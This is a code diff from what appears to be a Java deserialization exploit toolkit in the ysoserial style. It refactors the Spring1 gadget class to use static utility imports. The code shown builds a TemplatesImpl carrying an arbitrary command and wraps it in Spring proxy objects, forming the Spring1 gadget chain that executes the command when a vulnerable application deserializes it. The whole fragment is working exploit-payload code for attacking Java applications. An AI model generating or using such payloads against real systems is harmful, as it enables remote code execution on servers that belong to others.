@@ -12,7 +12,7 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Type;
 
-import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
+import static com.qi4l.JYso.gadgets.utils.Utils.*;
 import static java.lang.Class.forName;
 
 /**
@@ -56,14 +56,14 @@ public class Spring1 implements ObjectPayload<Object> {
         templates = Gadgets.createTemplatesImpl(command);
 
         final ObjectFactory objectFactoryProxy =
-                Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
+                createMemoitizedProxy(createMap("getObject", templates), ObjectFactory.class);
 
         final Type typeTemplatesProxy = createProxy((InvocationHandler)
                 Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
                         .newInstance(objectFactoryProxy), Type.class, Templates.class);
 
-        final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
-                Gadgets.createMap("getType", typeTemplatesProxy),
+        final Object typeProviderProxy = createMemoitizedProxy(
+                createMap("getType", typeTemplatesProxy),
                 forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
 
         final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
